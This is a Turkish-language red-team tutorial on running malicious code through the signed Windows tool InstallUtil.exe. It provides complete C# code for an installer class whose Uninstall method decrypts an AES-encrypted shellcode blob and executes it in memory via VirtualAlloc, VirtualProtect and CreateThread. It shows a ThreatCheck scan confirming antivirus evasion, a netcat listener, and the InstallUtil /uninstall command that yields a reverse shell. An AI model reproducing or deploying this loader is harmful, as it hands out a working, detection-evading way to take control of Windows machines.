# InstallUtil

## Scenario

* Zararlı kodu içeren bir [Installer.Uninstall](https://learn.microsoft.com/en-us/dotnet/api/system.configuration.install.installer.uninstall?view=netframework-4.8.1) yöntemi oluştur.
* Projeyi derle.
* Zararlı kodu tetiklemek için [InstallUtil.exe](https://learn.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool) aracına ait /uninstall seçeneğini kullan.

## Case Study

* Console App (.NET Framework 4.7.2)
* Release, x64
* IUtil.sln

## Adding Reference

Proje için gerekli [System.Configuration.Install](https://learn.microsoft.com/en-us/dotnet/api/system.configuration.install?view=netframework-4.8.1) isim uzayını referans olarak eklemek için aşağıda verilen yolu takip et:

* Project
* Add Reference
* Browse

Aşağıda yolu verilen DLL dosyasını aç:

```text title="Path"
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Configuration.Install\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Configuration.Install.dll
```

## Code

```cs title="Program.cs" linenums="1"
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace IUtil
{
    internal class Program
    {
        public static void Main(string[] args)
        {
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class A : System.Configuration.Install.Installer
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);

        [DllImport("kernel32")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string buffer = "vET7JrlOiNB5nQ7lxuOvQ9o01/cgBt+Po+vttJqwpZjrgq8u+6gRzpAPMZEkfNh3WsY5EpEU1uBn9RjGWuXf4uUMM61EZxo7DRaYjpaTNv7mHyuhrUd/xY6LGLjgqgcBnnRacyEI7oNct8pi0T9KEW1YmK1WgGfqptGE3M5Wg1r9Bud5BweUJwftMt6JsgbIsMl0hwEVz5+uR8hjdvIuWVAw0lm4P069Ce9EraeguDNSnlcqhJnnOgu+lx/P4mo3tPHn2DNJyhe3Zl5JyQlccxBSKHU3gr3VzmIyNNk9ej7CznIR2F/7ZVnAx37BtSeobLn/7g9reAkhh6EzT+DibOBUTJBMBYn6tVXMC37LadYxtDj12Ms0uCVIH/dcy98QvHszSgd+F7LudIQBEShIm9w9Ow2EuMQzhuaZwE68dmqtPrpZmIMj/b3rLzGj1k1606Nf7RkMelYvVx4z4x1wAZi+VUZPzQxXfGHa7EzQL1xhAWj1at8eKFryeLPhpseokPiJHjc3ZjTmlX5QorIG45Enaj/pe+tUT7i/G/UOm/r9L3jApe6yRp13PTHZHbKiuGV4vZ8lmT8s0YNOZmcSrGbusDBKx2V8mZDNQqqFK/ml5rxcyxGXmesjyZ8EPh6n";

            Aes aes = Aes.Create();

            byte[] key = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
            byte[] iv = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };

            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);

            byte[] buf;

            using (System.IO.MemoryStream msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(buffer)))
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (System.IO.MemoryStream msPlain = new System.IO.MemoryStream())
                    {
                        csDecrypt.CopyTo(msPlain);
                        buf = msPlain.ToArray();
                    }
                }
            }

            IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x00001000, 0x04);

            Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

            uint lpflOldProtect;
            VirtualProtect(lpStartAddress, (uint)buf.Length, 0x20, out lpflOldProtect);

            uint lpThreadId = 0;
            IntPtr hHandle = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);

            WaitForSingleObject(hHandle, 0xffffffff);
        }
    }
}
```

## Analyzing

```pwsh
PS C:\Users\Administrator> C:\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\x64\Release\ThreatCheck.exe -f C:\Tools\IUtil\IUtil\bin\x64\Release\IUtil.exe
```

```output title="Output"
[+] No threat found!
```

## Netcat Listener

```sh
my@attack:~$ nc -lvnp 9001
```

## Getting Reverse Shell

!!! warning

    Kullanılan binary, 64-bit ile uyumlu olmalıdır:

    * [ ] Framework
    * [x] Framework64

```pwsh
PS C:\Users\Administrator> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe C:\Tools\IUtil\IUtil\bin\x64\Release\IUtil.exe /uninstall /LogFile= /LogToConsole=false
```
